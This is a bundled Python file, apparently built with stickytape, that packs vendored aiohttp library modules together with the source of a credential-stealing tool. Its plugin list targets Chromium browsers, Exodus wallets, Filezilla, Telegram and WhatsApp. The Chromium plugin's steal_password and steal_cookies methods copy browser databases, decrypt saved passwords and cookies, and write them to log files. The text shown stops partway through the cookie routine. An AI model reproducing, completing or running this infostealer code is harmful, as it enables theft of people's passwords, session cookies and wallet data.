StopAsyncIteration\r\n        return msg\r\n')
    __stickytape_write_module('aiohttp/cookiejar.py', b'import asyncio\r\nimport contextlib\r\nimport datetime\r\nimport os  # noqa\r\nimport pathlib\r\nimport pickle\r\nimport re\r\nfrom collections import defaultdict\r\nfrom http.cookies import BaseCookie, Morsel, SimpleCookie\r\nfrom typing import (  # noqa\r\n    DefaultDict,\r\n    Dict,\r\n    Iterable,\r\n    Iterator,\r\n    List,\r\n    Mapping,\r\n    Optional,\r\n    Set,\r\n    Tuple,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nfrom yarl import URL\r\n\r\nfrom .abc import AbstractCookieJar, ClearCookiePredicate\r\nfrom .helpers import is_ip_address, next_whole_second\r\nfrom .typedefs import LooseCookies, PathLike, StrOrURL\r\n\r\n__all__ = ("CookieJar", "DummyCookieJar")\r\n\r\n\r\nCookieItem = Union[str, "Morsel[str]"]\r\n\r\n\r\nclass CookieJar(AbstractCookieJar):\r\n    """Implements cookie storage adhering to RFC 6265."""\r\n\r\n    DATE_TOKENS_RE = re.compile(\r\n        r"[\\x09\\x20-\\x2F\\x3B-\\x40\\x5B-\\x60\\x7B-\\x7E]*"\r\n        r"(?P<token>[\\x00-\\x08\\x0A-\\x1F\\d:a-zA-Z\\x7F-\\xFF]+)"\r\n    )\r\n\r\n    DATE_HMS_TIME_RE = re.compile(r"(\\d{1,2}):(\\d{1,2}):(\\d{1,2})")\r\n\r\n    DATE_DAY_OF_MONTH_RE = re.compile(r"(\\d{1,2})")\r\n\r\n    DATE_MONTH_RE = re.compile(\r\n        "(jan)|(feb)|(mar)|(apr)|(may)|(jun)|(jul)|" "(aug)|(sep)|(oct)|(nov)|(dec)",\r\n        re.I,\r\n    )\r\n\r\n    DATE_YEAR_RE = re.compile(r"(\\d{2,4})")\r\n\r\n    MAX_TIME = datetime.datetime.max.replace(tzinfo=datetime.timezone.utc)\r\n\r\n    MAX_32BIT_TIME = datetime.datetime.utcfromtimestamp(2 ** 31 - 1)\r\n\r\n    def __init__(\r\n        self,\r\n        *,\r\n        unsafe: bool = False,\r\n        quote_cookie: bool = True,\r\n        treat_as_secure_origin: Union[StrOrURL, List[StrOrURL], None] = None,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n    ) -> None:\r\n        super().__init__(loop=loop)\r\n        self._cookies = defaultdict(\r\n            SimpleCookie\r\n        )  # type: DefaultDict[str, SimpleCookie[str]]\r\n        self._host_only_cookies = set()  # type: Set[Tuple[str, str]]\r\n        self._unsafe = unsafe\r\n        self._quote_cookie = quote_cookie\r\n        if treat_as_secure_origin is None:\r\n            treat_as_secure_origin = []\r\n        elif isinstance(treat_as_secure_origin, URL):\r\n            treat_as_secure_origin = [treat_as_secure_origin.origin()]\r\n        elif isinstance(treat_as_secure_origin, str):\r\n            treat_as_secure_origin = [URL(treat_as_secure_origin).origin()]\r\n        else:\r\n            treat_as_secure_origin = [\r\n                URL(url).origin() if isinstance(url, str) else url.origin()\r\n                for url in treat_as_secure_origin\r\n            ]\r\n        self._treat_as_secure_origin = treat_as_secure_origin\r\n        self._next_expiration = next_whole_second()\r\n        self._expirations = {}  # type: Dict[Tuple[str, str], datetime.datetime]\r\n        # #4515: datetime.max may not be representable on 32-bit platforms\r\n        self._max_time = self.MAX_TIME\r\n        try:\r\n            self._max_time.timestamp()\r\n        except OverflowError:\r\n            self._max_time = self.MAX_32BIT_TIME\r\n\r\n    def save(self, file_path: PathLike) -> None:\r\n        file_path = pathlib.Path(file_path)\r\n        with file_path.open(mode="wb") as f:\r\n            pickle.dump(self._cookies, f, pickle.HIGHEST_PROTOCOL)\r\n\r\n    def load(self, file_path: PathLike) -> None:\r\n        file_path = pathlib.Path(file_path)\r\n        with file_path.open(mode="rb") as f:\r\n            self._cookies = pickle.load(f)\r\n\r\n    def clear(self, predicate: Optional[ClearCookiePredicate] = None) -> None:\r\n        if predicate is None:\r\n            self._next_expiration = next_whole_second()\r\n            self._cookies.clear()\r\n            self._host_only_cookies.clear()\r\n            self._expirations.clear()\r\n            return\r\n\r\n        to_del = []\r\n        now = datetime.datetime.now(datetime.timezone.utc)\r\n        for domain, cookie in self._cookies.items():\r\n            for name, morsel in cookie.items():\r\n                key = (domain, name)\r\n                if (\r\n                    key in self._expirations and self._expirations[key] <= now\r\n                ) or predicate(morsel):\r\n                    to_del.append(key)\r\n\r\n        for domain, name in to_del:\r\n            key = (domain, name)\r\n            self._host_only_cookies.discard(key)\r\n            if key in self._expirations:\r\n                del self._expirations[(domain, name)]\r\n            self._cookies[domain].pop(name, None)\r\n\r\n        next_expiration = min(self._expirations.values(), default=self._max_time)\r\n        try:\r\n            self._next_expiration = next_expiration.replace(\r\n                microsecond=0\r\n            ) + datetime.timedelta(seconds=1)\r\n        except OverflowError:\r\n            self._next_expiration = self._max_time\r\n\r\n    def clear_domain(self, domain: str) -> None:\r\n        self.clear(lambda x: self._is_domain_match(domain, x["domain"]))\r\n\r\n    def __iter__(self) -> "Iterator[Morsel[str]]":\r\n        self._do_expiration()\r\n        for val in self._cookies.values():\r\n            yield from val.values()\r\n\r\n    def __len__(self) -> int:\r\n        return sum(1 for i in self)\r\n\r\n    def _do_expiration(self) -> None:\r\n        self.clear(lambda x: False)\r\n\r\n    def _expire_cookie(self, when: datetime.datetime, domain: str, name: str) -> None:\r\n        self._next_expiration = min(self._next_expiration, when)\r\n        self._expirations[(domain, name)] = when\r\n\r\n    def update_cookies(self, cookies: LooseCookies, response_url: URL = URL()) -> None:\r\n        """Update cookies."""\r\n        hostname = response_url.raw_host\r\n\r\n        if not self._unsafe and is_ip_address(hostname):\r\n            # Don\'t accept cookies from IPs\r\n            return\r\n\r\n        if isinstance(cookies, Mapping):\r\n            cookies = cookies.items()\r\n\r\n        for name, cookie in cookies:\r\n            if not isinstance(cookie, Morsel):\r\n                tmp = SimpleCookie()  # type: SimpleCookie[str]\r\n                tmp[name] = cookie  # type: ignore[assignment]\r\n                cookie = tmp[name]\r\n\r\n            domain = cookie["domain"]\r\n\r\n            # ignore domains with trailing dots\r\n            if domain.endswith("."):\r\n                domain = ""\r\n                del cookie["domain"]\r\n\r\n            if not domain and hostname is not None:\r\n                # Set the cookie\'s domain to the response hostname\r\n                # and set its host-only-flag\r\n                self._host_only_cookies.add((hostname, name))\r\n                domain = cookie["domain"] = hostname\r\n\r\n            if domain.startswith("."):\r\n                # Remove leading dot\r\n                domain = domain[1:]\r\n                cookie["domain"] = domain\r\n\r\n            if hostname and not self._is_domain_match(domain, hostname):\r\n                # Setting cookies for different domains is not allowed\r\n                continue\r\n\r\n            path = cookie["path"]\r\n            if not path or not path.startswith("/"):\r\n                # Set the cookie\'s path to the response path\r\n                path = response_url.path\r\n                if not path.startswith("/"):\r\n                    path = "/"\r\n                else:\r\n                    # Cut everything from the last slash to the end\r\n                    path = "/" + path[1 : path.rfind("/")]\r\n                cookie["path"] = path\r\n\r\n            max_age = cookie["max-age"]\r\n            if max_age:\r\n                try:\r\n                    delta_seconds = int(max_age)\r\n                    try:\r\n                        max_age_expiration = datetime.datetime.now(\r\n                            datetime.timezone.utc\r\n                        ) + datetime.timedelta(seconds=delta_seconds)\r\n                    except OverflowError:\r\n                        max_age_expiration = self._max_time\r\n                    self._expire_cookie(max_age_expiration, domain, name)\r\n                except ValueError:\r\n                    cookie["max-age"] = ""\r\n\r\n            else:\r\n                expires = cookie["expires"]\r\n                if expires:\r\n                    expire_time = self._parse_date(expires)\r\n                    if expire_time:\r\n                        self._expire_cookie(expire_time, domain, name)\r\n                    else:\r\n                        cookie["expires"] = ""\r\n\r\n            self._cookies[domain][name] = cookie\r\n\r\n        self._do_expiration()\r\n\r\n    def filter_cookies(\r\n        self, request_url: URL = URL()\r\n    ) -> Union["BaseCookie[str]", "SimpleCookie[str]"]:\r\n        """Returns this jar\'s cookies filtered by their attributes."""\r\n        self._do_expiration()\r\n        request_url = URL(request_url)\r\n        filtered: Union["SimpleCookie[str]", "BaseCookie[str]"] = (\r\n            SimpleCookie() if self._quote_cookie else BaseCookie()\r\n        )\r\n        hostname = request_url.raw_host or ""\r\n        request_origin = URL()\r\n        with contextlib.suppress(ValueError):\r\n            request_origin = request_url.origin()\r\n\r\n        is_not_secure = (\r\n            request_url.scheme not in ("https", "wss")\r\n            and request_origin not in self._treat_as_secure_origin\r\n        )\r\n\r\n        for cookie in self:\r\n            name = cookie.key\r\n            domain = cookie["domain"]\r\n\r\n            # Send shared cookies\r\n            if not domain:\r\n                filtered[name] = cookie.value\r\n                continue\r\n\r\n            if not self._unsafe and is_ip_address(hostname):\r\n                continue\r\n\r\n            if (domain, name) in self._host_only_cookies:\r\n                if domain != hostname:\r\n                    continue\r\n            elif not self._is_domain_match(domain, hostname):\r\n                continue\r\n\r\n            if not self._is_path_match(request_url.path, cookie["path"]):\r\n                continue\r\n\r\n            if is_not_secure and cookie["secure"]:\r\n                continue\r\n\r\n            # It\'s critical we use the Morsel so the coded_value\r\n            # (based on cookie version) is preserved\r\n            mrsl_val = cast("Morsel[str]", cookie.get(cookie.key, Morsel()))\r\n            mrsl_val.set(cookie.key, cookie.value, cookie.coded_value)\r\n            filtered[name] = mrsl_val\r\n\r\n        return filtered\r\n\r\n    @staticmethod\r\n    def _is_domain_match(domain: str, hostname: str) -> bool:\r\n        """Implements domain matching adhering to RFC 6265."""\r\n        if hostname == domain:\r\n            return True\r\n\r\n        if not hostname.endswith(domain):\r\n            return False\r\n\r\n        non_matching = hostname[: -len(domain)]\r\n\r\n        if not non_matching.endswith("."):\r\n            return False\r\n\r\n        return not is_ip_address(hostname)\r\n\r\n    @staticmethod\r\n    def _is_path_match(req_path: str, cookie_path: str) -> bool:\r\n        """Implements path matching adhering to RFC 6265."""\r\n        if not req_path.startswith("/"):\r\n            req_path = "/"\r\n\r\n        if req_path == cookie_path:\r\n            return True\r\n\r\n        if not req_path.startswith(cookie_path):\r\n            return False\r\n\r\n        if cookie_path.endswith("/"):\r\n            return True\r\n\r\n        non_matching = req_path[len(cookie_path) :]\r\n\r\n        return non_matching.startswith("/")\r\n\r\n    @classmethod\r\n    def _parse_date(cls, date_str: str) -> Optional[datetime.datetime]:\r\n        """Implements date string parsing adhering to RFC 6265."""\r\n        if not date_str:\r\n            return None\r\n\r\n        found_time = False\r\n        found_day = False\r\n        found_month = False\r\n        found_year = False\r\n\r\n        hour = minute = second = 0\r\n        day = 0\r\n        month = 0\r\n        year = 0\r\n\r\n        for token_match in cls.DATE_TOKENS_RE.finditer(date_str):\r\n\r\n            token = token_match.group("token")\r\n\r\n            if not found_time:\r\n                time_match = cls.DATE_HMS_TIME_RE.match(token)\r\n                if time_match:\r\n                    found_time = True\r\n                    hour, minute, second = (int(s) for s in time_match.groups())\r\n                    continue\r\n\r\n            if not found_day:\r\n                day_match = cls.DATE_DAY_OF_MONTH_RE.match(token)\r\n                if day_match:\r\n                    found_day = True\r\n                    day = int(day_match.group())\r\n                    continue\r\n\r\n            if not found_month:\r\n                month_match = cls.DATE_MONTH_RE.match(token)\r\n                if month_match:\r\n                    found_month = True\r\n                    assert month_match.lastindex is not None\r\n                    month = month_match.lastindex\r\n                    continue\r\n\r\n            if not found_year:\r\n                year_match = cls.DATE_YEAR_RE.match(token)\r\n                if year_match:\r\n                    found_year = True\r\n                    year = int(year_match.group())\r\n\r\n        if 70 <= year <= 99:\r\n            year += 1900\r\n        elif 0 <= year <= 69:\r\n            year += 2000\r\n\r\n        if False in (found_day, found_month, found_year, found_time):\r\n            return None\r\n\r\n        if not 1 <= day <= 31:\r\n            return None\r\n\r\n        if year < 1601 or hour > 23 or minute > 59 or second > 59:\r\n            return None\r\n\r\n        return datetime.datetime(\r\n            year, month, day, hour, minute, second, tzinfo=datetime.timezone.utc\r\n        )\r\n\r\n\r\nclass DummyCookieJar(AbstractCookieJar):\r\n    """Implements a dummy cookie storage.\r\n\r\n    It can be used with the ClientSession when no cookie processing is needed.\r\n\r\n    """\r\n\r\n    def __init__(self, *, loop: Optional[asyncio.AbstractEventLoop] = None) -> None:\r\n        super().__init__(loop=loop)\r\n\r\n    def __iter__(self) -> "Iterator[Morsel[str]]":\r\n        while False:\r\n            yield None\r\n\r\n    def __len__(self) -> int:\r\n        return 0\r\n\r\n    def clear(self, predicate: Optional[ClearCookiePredicate] = None) -> None:\r\n        pass\r\n\r\n    def clear_domain(self, domain: str) -> None:\r\n        pass\r\n\r\n    def update_cookies(self, cookies: LooseCookies, response_url: URL = URL()) -> None:\r\n        pass\r\n\r\n    def filter_cookies(self, request_url: URL) -> "BaseCookie[str]":\r\n        return SimpleCookie()\r\n')
    __stickytape_write_module('aiohttp/payload_streamer.py', b'"""\r\nPayload implemenation for coroutines as data provider.\r\n\r\nAs a simple case, you can upload data from file::\r\n\r\n   @aiohttp.streamer\r\n   async def file_sender(writer, file_name=None):\r\n      with open(file_name, \'rb\') as f:\r\n          chunk = f.read(2**16)\r\n          while chunk:\r\n              await writer.write(chunk)\r\n\r\n              chunk = f.read(2**16)\r\n\r\nThen you can use `file_sender` like this:\r\n\r\n    async with session.post(\'http://httpbin.org/post\',\r\n                            data=file_sender(file_name=\'huge_file\')) as resp:\r\n        print(await resp.text())\r\n\r\n..note:: Coroutine must accept `writer` as first argument\r\n\r\n"""\r\n\r\nimport types\r\nimport warnings\r\nfrom typing import Any, Awaitable, Callable, Dict, Tuple\r\n\r\nfrom .abc import AbstractStreamWriter\r\nfrom .payload import Payload, payload_type\r\n\r\n__all__ = ("streamer",)\r\n\r\n\r\nclass _stream_wrapper:\r\n    def __init__(\r\n        self,\r\n        coro: Callable[..., Awaitable[None]],\r\n        args: Tuple[Any, ...],\r\n        kwargs: Dict[str, Any],\r\n    ) -> None:\r\n        self.coro = types.coroutine(coro)\r\n        self.args = args\r\n        self.kwargs = kwargs\r\n\r\n    async def __call__(self, writer: AbstractStreamWriter) -> None:\r\n        await self.coro(writer, *self.args, **self.kwargs)  # type: ignore[operator]\r\n\r\n\r\nclass streamer:\r\n    def __init__(self, coro: Callable[..., Awaitable[None]]) -> None:\r\n        warnings.warn(\r\n            "@streamer is deprecated, use async generators instead",\r\n            DeprecationWarning,\r\n            stacklevel=2,\r\n        )\r\n        self.coro = coro\r\n\r\n    def __call__(self, *args: Any, **kwargs: Any) -> _stream_wrapper:\r\n        return _stream_wrapper(self.coro, args, kwargs)\r\n\r\n\r\n@payload_type(_stream_wrapper)\r\nclass StreamWrapperPayload(Payload):\r\n    async def write(self, writer: AbstractStreamWriter) -> None:\r\n        await self._value(writer)\r\n\r\n\r\n@payload_type(streamer)\r\nclass StreamPayload(StreamWrapperPayload):\r\n    def __init__(self, value: Any, *args: Any, **kwargs: Any) -> None:\r\n        super().__init__(value(), *args, **kwargs)\r\n\r\n    async def write(self, writer: AbstractStreamWriter) -> None:\r\n        await self._value(writer)\r\n')
    __stickytape_write_module('aiohttp/worker.py', b'"""Async gunicorn worker for aiohttp.web"""\r\n\r\nimport asyncio\r\nimport os\r\nimport re\r\nimport signal\r\nimport sys\r\nfrom types import FrameType\r\nfrom typing import Any, Awaitable, Callable, Optional, Union  # noqa\r\n\r\nfrom gunicorn.config import AccessLogFormat as GunicornAccessLogFormat\r\nfrom gunicorn.workers import base\r\n\r\nfrom aiohttp import web\r\n\r\nfrom .helpers import set_result\r\nfrom .web_app import Application\r\nfrom .web_log import AccessLogger\r\n\r\ntry:\r\n    import ssl\r\n\r\n    SSLContext = ssl.SSLContext\r\nexcept ImportError:  # pragma: no cover\r\n    ssl = None  # type: ignore[assignment]\r\n    SSLContext = object  # type: ignore[misc,assignment]\r\n\r\n\r\n__all__ = ("GunicornWebWorker", "GunicornUVLoopWebWorker", "GunicornTokioWebWorker")\r\n\r\n\r\nclass GunicornWebWorker(base.Worker):  # type: ignore[misc,no-any-unimported]\r\n\r\n    DEFAULT_AIOHTTP_LOG_FORMAT = AccessLogger.LOG_FORMAT\r\n    DEFAULT_GUNICORN_LOG_FORMAT = GunicornAccessLogFormat.default\r\n\r\n    def __init__(self, *args: Any, **kw: Any) -> None:  # pragma: no cover\r\n        super().__init__(*args, **kw)\r\n\r\n        self._task = None  # type: Optional[asyncio.Task[None]]\r\n        self.exit_code = 0\r\n        self._notify_waiter = None  # type: Optional[asyncio.Future[bool]]\r\n\r\n    def init_process(self) -> None:\r\n        # create new event_loop after fork\r\n        asyncio.get_event_loop().close()\r\n\r\n        self.loop = asyncio.new_event_loop()\r\n        asyncio.set_event_loop(self.loop)\r\n\r\n        super().init_process()\r\n\r\n    def run(self) -> None:\r\n        self._task = self.loop.create_task(self._run())\r\n\r\n        try:  # ignore all finalization problems\r\n            self.loop.run_until_complete(self._task)\r\n        except Exception:\r\n            self.log.exception("Exception in gunicorn worker")\r\n        self.loop.run_until_complete(self.loop.shutdown_asyncgens())\r\n        self.loop.close()\r\n\r\n        sys.exit(self.exit_code)\r\n\r\n    async def _run(self) -> None:\r\n        runner = None\r\n        if isinstance(self.wsgi, Application):\r\n            app = self.wsgi\r\n        elif asyncio.iscoroutinefunction(self.wsgi):\r\n            wsgi = await self.wsgi()\r\n            if isinstance(wsgi, web.AppRunner):\r\n                runner = wsgi\r\n                app = runner.app\r\n            else:\r\n                app = wsgi\r\n        else:\r\n            raise RuntimeError(\r\n                "wsgi app should be either Application or "\r\n                "async function returning Application, got {}".format(self.wsgi)\r\n            )\r\n\r\n        if runner is None:\r\n            access_log = self.log.access_log if self.cfg.accesslog else None\r\n            runner = web.AppRunner(\r\n                app,\r\n                logger=self.log,\r\n                keepalive_timeout=self.cfg.keepalive,\r\n                access_log=access_log,\r\n                access_log_format=self._get_valid_log_format(\r\n                    self.cfg.access_log_format\r\n                ),\r\n            )\r\n        await runner.setup()\r\n\r\n        ctx = self._create_ssl_context(self.cfg) if self.cfg.is_ssl else None\r\n\r\n        runner = runner\r\n        assert runner is not None\r\n        server = runner.server\r\n        assert server is not None\r\n        for sock in self.sockets:\r\n            site = web.SockSite(\r\n                runner,\r\n                sock,\r\n                ssl_context=ctx,\r\n                shutdown_timeout=self.cfg.graceful_timeout / 100 * 95,\r\n            )\r\n            await site.start()\r\n\r\n        # If our parent changed then we shut down.\r\n        pid = os.getpid()\r\n        try:\r\n            while self.alive:  # type: ignore[has-type]\r\n                self.notify()\r\n\r\n                cnt = server.requests_count\r\n                if self.cfg.max_requests and cnt > self.cfg.max_requests:\r\n                    self.alive = False\r\n                    self.log.info("Max requests, shutting down: %s", self)\r\n\r\n                elif pid == os.getpid() and self.ppid != os.getppid():\r\n                    self.alive = False\r\n                    self.log.info("Parent changed, shutting down: %s", self)\r\n                else:\r\n                    await self._wait_next_notify()\r\n        except BaseException:\r\n            pass\r\n\r\n        await runner.cleanup()\r\n\r\n    def _wait_next_notify(self) -> "asyncio.Future[bool]":\r\n        self._notify_waiter_done()\r\n\r\n        loop = self.loop\r\n        assert loop is not None\r\n        self._notify_waiter = waiter = loop.create_future()\r\n        self.loop.call_later(1.0, self._notify_waiter_done, waiter)\r\n\r\n        return waiter\r\n\r\n    def _notify_waiter_done(\r\n        self, waiter: Optional["asyncio.Future[bool]"] = None\r\n    ) -> None:\r\n        if waiter is None:\r\n            waiter = self._notify_waiter\r\n        if waiter is not None:\r\n            set_result(waiter, True)\r\n\r\n        if waiter is self._notify_waiter:\r\n            self._notify_waiter = None\r\n\r\n    def init_signals(self) -> None:\r\n        # Set up signals through the event loop API.\r\n\r\n        self.loop.add_signal_handler(\r\n            signal.SIGQUIT, self.handle_quit, signal.SIGQUIT, None\r\n        )\r\n\r\n        self.loop.add_signal_handler(\r\n            signal.SIGTERM, self.handle_exit, signal.SIGTERM, None\r\n        )\r\n\r\n        self.loop.add_signal_handler(\r\n            signal.SIGINT, self.handle_quit, signal.SIGINT, None\r\n        )\r\n\r\n        self.loop.add_signal_handler(\r\n            signal.SIGWINCH, self.handle_winch, signal.SIGWINCH, None\r\n        )\r\n\r\n        self.loop.add_signal_handler(\r\n            signal.SIGUSR1, self.handle_usr1, signal.SIGUSR1, None\r\n        )\r\n\r\n        self.loop.add_signal_handler(\r\n            signal.SIGABRT, self.handle_abort, signal.SIGABRT, None\r\n        )\r\n\r\n        # Don\'t let SIGTERM and SIGUSR1 disturb active requests\r\n        # by interrupting system calls\r\n        signal.siginterrupt(signal.SIGTERM, False)\r\n        signal.siginterrupt(signal.SIGUSR1, False)\r\n        # Reset signals so Gunicorn doesn\'t swallow subprocess return codes\r\n        # See: https://github.com/aio-libs/aiohttp/issues/6130\r\n        if sys.version_info < (3, 8):\r\n            # Starting from Python 3.8,\r\n            # the default child watcher is ThreadedChildWatcher.\r\n            # The watcher doesn\'t depend on SIGCHLD signal,\r\n            # there is no need to reset it.\r\n            signal.signal(signal.SIGCHLD, signal.SIG_DFL)\r\n\r\n    def handle_quit(self, sig: int, frame: FrameType) -> None:\r\n        self.alive = False\r\n\r\n        # worker_int callback\r\n        self.cfg.worker_int(self)\r\n\r\n        # wakeup closing process\r\n        self._notify_waiter_done()\r\n\r\n    def handle_abort(self, sig: int, frame: FrameType) -> None:\r\n        self.alive = False\r\n        self.exit_code = 1\r\n        self.cfg.worker_abort(self)\r\n        sys.exit(1)\r\n\r\n    @staticmethod\r\n    def _create_ssl_context(cfg: Any) -> "SSLContext":\r\n        """Creates SSLContext instance for usage in asyncio.create_server.\r\n\r\n        See ssl.SSLSocket.__init__ for more details.\r\n        """\r\n        if ssl is None:  # pragma: no cover\r\n            raise RuntimeError("SSL is not supported.")\r\n\r\n        ctx = ssl.SSLContext(cfg.ssl_version)\r\n        ctx.load_cert_chain(cfg.certfile, cfg.keyfile)\r\n        ctx.verify_mode = cfg.cert_reqs\r\n        if cfg.ca_certs:\r\n            ctx.load_verify_locations(cfg.ca_certs)\r\n        if cfg.ciphers:\r\n            ctx.set_ciphers(cfg.ciphers)\r\n        return ctx\r\n\r\n    def _get_valid_log_format(self, source_format: str) -> str:\r\n        if source_format == self.DEFAULT_GUNICORN_LOG_FORMAT:\r\n            return self.DEFAULT_AIOHTTP_LOG_FORMAT\r\n        elif re.search(r"%\\([^\\)]+\\)", source_format):\r\n            raise ValueError(\r\n                "Gunicorn\'s style options in form of `%(name)s` are not "\r\n                "supported for the log formatting. Please use aiohttp\'s "\r\n                "format specification to configure access log formatting: "\r\n                "http://docs.aiohttp.org/en/stable/logging.html"\r\n                "#format-specification"\r\n            )\r\n        else:\r\n            return source_format\r\n\r\n\r\nclass GunicornUVLoopWebWorker(GunicornWebWorker):\r\n    def init_process(self) -> None:\r\n        import uvloop\r\n\r\n        # Close any existing event loop before setting a\r\n        # new policy.\r\n        asyncio.get_event_loop().close()\r\n\r\n        # Setup uvloop policy, so that every\r\n        # asyncio.get_event_loop() will create an instance\r\n        # of uvloop event loop.\r\n        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())\r\n\r\n        super().init_process()\r\n\r\n\r\nclass GunicornTokioWebWorker(GunicornWebWorker):\r\n    def init_process(self) -> None:  # pragma: no cover\r\n        import tokio\r\n\r\n        # Close any existing event loop before setting a\r\n        # new policy.\r\n        asyncio.get_event_loop().close()\r\n\r\n        # Setup tokio policy, so that every\r\n        # asyncio.get_event_loop() will create an instance\r\n        # of tokio event loop.\r\n        asyncio.set_event_loop_policy(tokio.EventLoopPolicy())\r\n\r\n        super().init_process()\r\n')
    __stickytape_write_module('paths.py', b"from os import environ\r\nfrom os.path import join\r\n\r\n\r\nLOCAL = environ['USERPROFILE']\r\nTEMP = join(LOCAL, 'appdata', 'local', 'temp')")
    __stickytape_write_module('plugins/__init__.py', b'from .base_plugin import Plugin\r\n\r\nfrom .browsers import Chromium\r\n\r\nfrom .details import Details\r\n\r\nfrom .wallets import Exodus\r\n\r\nfrom .filezilla import Filezilla\r\n\r\nfrom .telegram import Telegram\r\n\r\nfrom .whatsapp import Whatsapp')
    __stickytape_write_module('plugins/base_plugin.py', b'from config import Config\r\nfrom abc import ABC, abstractmethod\r\n\r\n\r\nclass Plugin(ABC):\r\n    @abstractmethod\r\n    def __init__(self, conf: Config) -> None:\r\n        ...\r\n\r\n    @abstractmethod\r\n    async def callback(path: str) -> None:\r\n        ...')
    __stickytape_write_module('plugins/browsers/__init__.py', b'from .chromium import Chromium')
    __stickytape_write_module('plugins/browsers/chromium.py', b"from asyncio import Task, create_task\r\nfrom typing import List\r\nfrom plugins import Plugin\r\nfrom config import Config\r\nfrom os import scandir, mkdir\r\nfrom os.path import join, isdir, isfile, split\r\nfrom tools import copyfile, copytree, _handle_task_result\r\nfrom path_search import search_paths\r\nimport aiosqlite\r\nfrom .decrypt import Decryptor\r\nfrom time import time\r\nfrom paths import TEMP\r\nfrom secrets import token_hex\r\nfrom aiofiles import open\r\n\r\n\r\n\r\nclass Chromium(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n        self.decryptor = None\r\n\r\n\r\n    async def set_decryptor(self, root_path: str) -> None:\r\n        local_state_folders = {\r\n            join(root_path, 'user data'),\r\n            root_path\r\n        }\r\n\r\n        local_states = []\r\n        async for i in search_paths(local_state_folders, {'Local State'}):\r\n            local_states.append(i)\r\n\r\n        if local_states:\r\n            local_state_path = local_states[0]\r\n        else:\r\n            local_state_path = None\r\n\r\n        self.decryptor = Decryptor(local_state_path)\r\n\r\n\r\n    async def steal_password(self, root_path: str) -> None:\r\n        try:\r\n            rows = []\r\n\r\n            if not isdir(root_path):\r\n                return []\r\n\r\n            login_data_folder_paths = {\r\n                join(root_path, 'user data', 'default'),\r\n                root_path\r\n            }\r\n\r\n            async for p in search_paths(login_data_folder_paths, {'Login Data'}):\r\n                try:\r\n                    if not isfile(p):\r\n                        continue\r\n                    \r\n                    temp_path = join(TEMP, f'Login Data {time()}')\r\n                    await copyfile(p, temp_path)\r\n\r\n                    if not self.decryptor:\r\n                        await self.set_decryptor(root_path)\r\n                    async with aiosqlite.connect(temp_path) as conn:\r\n                        sql = 'select * from logins'\r\n                        async with conn.execute(sql) as curr:\r\n                            async for row in curr:\r\n                                try:\r\n                                    rows.append((row[1], row[3], self.decryptor.decrypt_password(row[5])))\r\n                                except Exception as e:\r\n                                    await self.conf.logger.log(f'\xd0\x9e\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb8 \xd0\xb4\xd0\xb5\xd0\xba\xd1\x80\xd0\xb8\xd0\xbf\xd1\x82\xd0\xb5 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8f, {e}')\r\n                except Exception as e:\r\n                    await self.conf.logger.log(f'\xd0\x9e\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb8 \xd0\xbf\xd0\xbe\xd0\xbf\xd1\x8b\xd1\x82\xd0\xba\xd0\xb5 \xd1\x81\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb4\xd0\xb8\xd1\x82\xd1\x8c \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd0\xb8 \xd1\x81 {p}, \xd0\xbe\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 {e}')\r\n\r\n            if rows:\r\n                name = f'{split(root_path)[1]}_{token_hex(5)}.txt'\r\n                passwords_path = join(self.conf.log_path, 'passwords')\r\n                path = join(passwords_path, name)\r\n\r\n                if not isdir(passwords_path):\r\n                    mkdir(passwords_path)\r\n\r\n                async with open(path, 'w', encoding='utf8') as f:\r\n                    for url, login, password in rows:\r\n                        await f.write(f'URL: {url}\\nLogin: {login}\\nPassword: {password}\\n\\n')\r\n\r\n                await self.conf.logger.log(f'\xd0\xa1\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb6\xd0\xb5\xd0\xbd\xd1\x8b \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd0\xb8 \xd1\x81 {root_path}')\r\n        except Exception as e:\r\n            await self.conf.logger.log(f'Error in steal_password: {e}')\r\n\r\n    async def steal_cookies(self, root_path: str) -> None:\r\n        try:\r\n            if not isdir(root_path):\r\n                return []\r\n\r\n            cookies = ''\r\n\r\n            cookie_folder_paths = {\r\n                join(root_path, 'user data', 'default', 'network'), \r\n                join(root_path, 'user data', 'default'),\r\n                root_path\r\n            }\r\n\r\n            async for p in search_paths(cookie_folder_paths, {'Cookies', 'cookies.sqlite'}):\r\n                if not isfile(p):\r\n                    continue\r\n\r\n                temp_path = join(TEMP, f'Cookies {time()}')\r\n                await copyfile(p, temp_path)\r\n\r\n                if not self.decryptor:\r\n                    await self.set_decryptor(root_path)\r\n                        \r\n                async with aiosqlite.connect(temp_path) as conn:\r\n                    sql = 'select * from cookies'\r\n                    async with conn.execute(sql) as curr:\r\n                        async for row in curr:\r\n                            conv = lambda x: 'TRUE' if x else 'FALSE'\r\n\r\n                            try:\r\n                                host = row[1]\r\n                                http_only = conv(row[9])\r\n                                path = row[6]\r\n                                secure = conv(row[8])\r\n                                expiration_date = str(row[7])\r\n                                name = row[3]\r\n                                value = self.decryptor.decrypt_password(row[5])\r\n                            except Exception as e:\r\n                                await self.conf.logger.log(f'\xd0\x9e\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb8 \xd0\xb4\xd0\xb5\xd0\xba\xd1\x80\xd0\xb8\xd0\xbf\xd1\x82\xd0\xb5 \xd0\xba\xd1\x83\xd0\xba\xd0\xb0, {e}')\r\n                            \r\n                            if not value:\r\n                                value = ''\r\n\r\n                            cookie = '\\t'.join(\r\n                                (host, http_only, path, secure, expiration_date, name, value))\r\n                            cookies += cookie + '\\n'\r\n\r\n            if cookies:\r\n                name = f'{split(root_path)[1]}_{token_hex(5)}.txt'\r\n                